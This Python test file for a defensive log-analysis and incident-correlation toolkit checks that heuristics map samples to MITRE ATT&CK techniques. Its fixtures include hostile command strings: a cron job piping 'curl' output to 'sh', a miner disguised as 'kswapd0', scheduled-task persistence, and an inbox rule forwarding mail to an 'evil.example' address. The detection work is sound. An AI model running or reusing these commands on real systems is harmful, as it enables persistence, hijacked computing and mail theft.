import unittest
import os
import tempfile
import csv
from datetime import datetime, timezone
from bluekit.logs.parse import load_rows, get_csv_reader
from bluekit.ir.correlator import load_events_from_files, extract_canonical, correlate_incident
from bluekit.logs.detect import detect_event
from bluekit.kb.build import parse_heuristics
from bluekit.kb.query import KB

class TestIRGaps(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        # Heuristika testlari qayta qurilgan haqiqiy KB dan foydalanadi (heuristics.yaml -> kb.sqlite)
        from bluekit.paths import get_kb_path
        kb_path = get_kb_path()
        if not os.path.exists(kb_path):
            raise unittest.SkipTest("kb.sqlite topilmadi")
        cls.kb = KB(kb_path)

    def test_csv_space_heavy_comma_file(self):
        content = (
            "@timestamp,host.name,user.name,winlog.channel,event.code,message\n"
            "2026-10-01 10:00:00, host1 , user1 , Application , 1 , \"Some message, with commas\"\n"
            "2026-10-01 10:01:00, host2 , user2 , Application , 2 , \"Msg2, commas, lots\"\n"
            "2026-10-01 10:02:00, host3 , user3 , Application , 3 , \"Msg3\"\n"
            "2026-10-01 10:03:00, host4 , user4 , Application , 4 , \"Msg4\"\n"
            "2026-10-01 10:04:00, host5 , user5 , Application , 5 , \"Msg5\"\n"
        )
        with tempfile.NamedTemporaryFile(mode='w', suffix='.csv', delete=False) as f:
            f.write(content)
            f_name = f.name
        
        try:
            evs, _ = load_events_from_files([f_name])
            self.assertEqual(len(evs), 5)
            for ev in evs:
                canon = extract_canonical(ev)
                self.assertTrue(bool(canon['timestamp']))
                self.assertTrue(bool(canon['host']))
                
            rows = load_rows(f_name)
            self.assertEqual(len(rows), 5)
            self.assertIn('host.name', rows[0])
        finally:
            os.remove(f_name)

    def test_semicolon_csv(self):
        content = (
            "col1;col2;col3\n"
            "val1;val2;val3\n"
            "v1;v2;v3\n"
            "a;b;c\n"
        )
        with tempfile.NamedTemporaryFile(mode='w', suffix='.csv', delete=False) as f:
            f.write(content)
            f_name = f.name
        try:
            rows = load_rows(f_name)
            self.assertEqual(len(rows), 3)
            self.assertEqual(len(rows[0].keys()), 3)
            self.assertIn('col1', rows[0])
        finally:
            os.remove(f_name)

    def test_nginx_csv_columns(self):
        content = (
            "time_local,remote_ip,request,status,bytes,user_agent\n"
            "2026-09-18 09:00:00,52.113.194.132,POST /uploads/a.php HTTP/1.1,200,231,kube-probe/1.28\n"
            "2026-09-18 09:01:00,10.0.0.1,GET / HTTP/1.1,404,100,curl\n"
        )
        with tempfile.NamedTemporaryFile(mode='w', suffix='.csv', delete=False) as f:
            f.write(content)
            f_name = f.name
        try:
            evs, _ = load_events_from_files([f_name])
            self.assertEqual(len(evs), 2)
            c = extract_canonical(evs[0])
            self.assertTrue(bool(c['timestamp']))
            self.assertEqual(c['src_ip'], '52.113.194.132')
            self.assertEqual(c['method'], 'POST')
            self.assertEqual(c['url_path'], '/uploads/a.php')
            self.assertEqual(c['status_code'], 200)
            self.assertEqual(c['dataset'], 'web')
        finally:
            os.remove(f_name)

    def test_schtasks_any_order(self):
        text1 = 'schtasks /create /tn "U" /tr C:\\x.exe /sc onlogon'
        text2 = 'schtasks /sc onlogon /create /tn "U" /tr C:\\x.exe'
        res1 = self.kb.search_heuristics(text1)
        res2 = self.kb.search_heuristics(text2)
        self.assertTrue(any(r['attack_id'] == 'T1053.005' for r in res1))
        self.assertTrue(any(r['attack_id'] == 'T1053.005' for r in res2))

    def test_miner_and_masquerade_patterns(self):
        t1 = '/tmp/.x/kswapd0 -o 1.2.3.4:443 --tls -u wallet.x'
        res1 = self.kb.search_heuristics(t1)
        techs1 = [r['attack_id'] for r in res1]
        self.assertIn('T1496', techs1)
        self.assertIn('T1036.005', techs1)
        
        t2 = 'xmrig --donate-level 1'
        res2 = self.kb.search_heuristics(t2)
        techs2 = [r['attack_id'] for r in res2]
        self.assertIn('T1496', techs2)
        self.assertNotIn('T1036.005', techs2)
        
        t3 = '/usr/sbin/cron -f'
        t4 = 'ps aux | grep kswapd0'
        t5 = 'curl -o out.txt -u user:pass https://x'
        self.assertFalse(any(r['attack_id'] in ('T1496', 'T1036.005') for r in self.kb.search_heuristics(t3)))
        self.assertFalse(any(r['attack_id'] in ('T1496', 'T1036.005') for r in self.kb.search_heuristics(t4)))
        self.assertFalse(any(r['attack_id'] in ('T1496', 'T1036.005') for r in self.kb.search_heuristics(t5)))

    def test_archive_attachment_scoped(self):
        t1 = 'pg_dump -Fc db | gzip > /var/tmp/.cache/x.dump.gz'
        t2 = 'tar -czf /tmp/b.tar.gz /etc'
        self.assertFalse(any(r['attack_id'] == 'T1566.001' for r in self.kb.search_heuristics(t1)))
        self.assertFalse(any(r['attack_id'] == 'T1566.001' for r in self.kb.search_heuristics(t2)))
        
        t3 = r'C:\Users\a\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\AB12\invoice.zip'
        self.assertTrue(any(r['attack_id'] == 'T1566.001' for r in self.kb.search_heuristics(t3)))

    def test_cron_line_pattern(self):
        t1 = '* * * * * /tmp/.x/kswapd0'
        t2 = '*/5 * * * * curl -s http://x/a | sh'
        self.assertTrue(any(r['attack_id'] == 'T1053.003' for r in self.kb.search_heuristics(t1)))
        self.assertTrue(any(r['attack_id'] == 'T1053.003' for r in self.kb.search_heuristics(t2)))
        
        t3 = '0 3 * * * /usr/local/bin/backup.sh'
        self.assertFalse(any(r['attack_id'] == 'T1053.003' for r in self.kb.search_heuristics(t3)))

    def test_ssh_password_external_and_internal(self):
        ev_ext = {
            'timestamp': '2026-10-01T10:00:00Z',
            'dataset': 'auth',
            'host': 'server1',
            'process_name': 'sshd',
            'message': 'Accepted password for deploy from 203.0.113.9 port 51000 ssh2',
            '_raw': {}
        }
        ev_int1 = {
            'timestamp': '2026-10-01T10:05:00Z',
            'dataset': 'auth',
            'host': 'server2',
            'process_name': 'sshd',
            'message': 'Accepted publickey for ops from 10.1.1.5 port 5 ssh2',
            '_raw': {}
        }
        ev_int2 = dict(ev_int1, timestamp='2026-10-01T10:06:00Z')
        ev_int3 = dict(ev_int1, timestamp='2026-10-01T10:07:00Z')
        
        chain = correlate_incident([ev_ext, ev_int1, ev_int2, ev_int3], kb=self.kb, heuristic_fallback=False)
        stages = chain.stages
        
        # Check external
        self.assertTrue(any(s.technique_id == 'T1133' for s in stages))
        self.assertTrue(any(s.technique_id == 'T1078' and s.phase == 'Initial Access' for s in stages))
        self.assertIn('203.0.113.9', chain.attacker_ips)
        
        # Check internal deduplication
        t1021_stages = [s for s in stages if s.technique_id == 'T1021.004']
        self.assertEqual(len(t1021_stages), 1)
        self.assertEqual(t1021_stages[0].confidence, 'MEDIUM')
        self.assertEqual(t1021_stages[0].iocs.get('count'), 3)

    def test_m365_inbox_rule_consent_and_travel(self):
        ev1 = {
            'timestamp': '2026-10-01T10:00:00Z',
            'host': 'CLOUD',
            'channel': 'M365/AuditLog',
            'event_id': 'New-InboxRule',
            'message': "New-InboxRule 'x': forward subject invoice to ext@evil.example",
            '_raw': {}
        }
        ev2 = {
            'timestamp': '2026-10-01T10:05:00Z',
            'host': 'CLOUD',
            'channel': 'AzureAD/AuditLog',
            'event_id': 'Consent',
            'message': "Consent to app 'Viewer' (Mail.Read)",
            '_raw': {}
        }
        ev3 = {
            'timestamp': '2026-10-01T10:10:00Z',
            'host': 'CLOUD',
            'channel': 'AzureAD/SignInLogs',
            'event_id': 'UserLoggedIn',
            'user': 'alice',
            'src_ip': '198.51.100.7',
            'message': 'Success',
            '_raw': {}
        }
        ev4 = {
            'timestamp': '2026-10-01T10:30:00Z',
            'host': 'CLOUD',
            'channel': 'AzureAD/SignInLogs',
            'event_id': 'UserLoggedIn',
            'user': 'alice',
            'src_ip': '45.9.1.2',
            'message': 'Success',
            '_raw': {}
        }
        ev5 = {
            'timestamp': '2026-10-01T11:00:00Z',
            'host': 'CLOUD',
            'channel': 'AzureAD/SignInLogs',
            'event_id': 'UserLoggedIn',
            'user': 'bob',
            'src_ip': '8.8.8.8',
            'message': 'Success',
            '_raw': {}
        }
        ev6 = {
            'timestamp': '2026-10-01T11:10:00Z',
            'host': 'CLOUD',
            'channel': 'AzureAD/SignInLogs',
            'event_id': 'UserLoggedIn',
            'user': 'bob',
            'src_ip': '8.8.8.8', # same IP
            'message': 'Success',
            '_raw': {}
        }
        
        chain = correlate_incident([ev1, ev2, ev3, ev4, ev5, ev6], kb=self.kb, heuristic_fallback=False)
        techs = {s.technique_id for s in chain.stages}
        self.assertIn('T1114.003', techs)
        self.assertIn('T1564.008', techs)
        self.assertIn('T1528', techs)
        self.assertIn('T1078.004', techs)
        
        t1528 = [s for s in chain.stages if s.technique_id == 'T1528'][0]
        self.assertEqual(t1528.iocs.get('app'), 'Viewer')
        self.assertIn('45.9.1.2', chain.attacker_ips)
        
        # Check negative: same IP for bob
        bobs_1078 = [s for s in chain.stages if s.technique_id == 'T1078.004' and s.iocs.get('user') == 'bob']
        self.assertEqual(len(bobs_1078), 0)

    def test_detect_process_name_heuristic(self):
        ev = {
            'channel': 'Application',
            'event_id': '4',
            'process': 'AnyDesk.exe',
            'command_line': None,
            'message': 'incoming session accepted'
        }
        hits = detect_event(self.kb, ev)
        self.assertTrue(any(h['technique'] == 'T1219' for h in hits))

    def test_external_ssh_aggregated(self):
        # Bitta tashqi IP dan 20 ta kirish 40 ta qadam emas, bitta T1133 + bitta T1078 bo'lishi kerak
        def e(minute):
            return {"@timestamp": f"2026-10-01T10:{minute:02d}:00Z", "event": {"dataset": "auth"},
                    "host": {"name": "srv-01"}, "process": {"name": "sshd"},
                    "message": "Accepted password for admin from 203.0.113.50 port 5000 ssh2"}
        # tartibsiz vaqtlar: eng birinchisi (10:00) qadam vaqti, eng oxirgisi (10:19) last_seen bo'lsin
        events = [e(m) for m in [5] + list(range(19, 5, -1)) + [0, 1, 2, 3, 4]]
        stages = correlate_incident(events, heuristic_fallback=False).stages
        for tid in ("T1133", "T1078"):
            hit = [s for s in stages if s.technique_id == tid]
            self.assertEqual(len(hit), 1)
            self.assertEqual(hit[0].iocs["count"], 20)
            # ichki vaqt Toshkent (+05:00) ga keltiriladi: 10:00Z -> 15:00+05:00
            self.assertEqual(hit[0].timestamp, "2026-10-01T15:00:00+05:00")
            self.assertEqual(hit[0].iocs["last_seen"], "2026-10-01T15:19:00+05:00")

    def test_hidden_tmp_exec_reaches_heuristics(self):
        # T1105 qoidasi yuklovchisiz yashirin /tmp ishga tushirishni egallab olmasin: heuristikalar ham ishlashi kerak
        def e(ts, cmd):
            return {"@timestamp": ts, "event": {"dataset": "syslog"}, "host": {"name": "lin-01"},
                    "user": {"name": "deploy"}, "process": {"command_line": cmd}}
        events = [e("2026-09-26T02:14:00Z", "/tmp/.x/kswapd0 -o 10.9.8.7:443 --tls -u wallet.w"),
                  e("2026-09-26T02:17:00Z", "* * * * * /tmp/.x/kswapd0")]
        techs = [s.technique_id for s in correlate_incident(events, self.kb).stages]
        self.assertIn('T1496', techs)
        self.assertIn('T1036.005', techs)
        self.assertIn('T1053.003', techs)

if __name__ == '__main__':
    unittest.main()
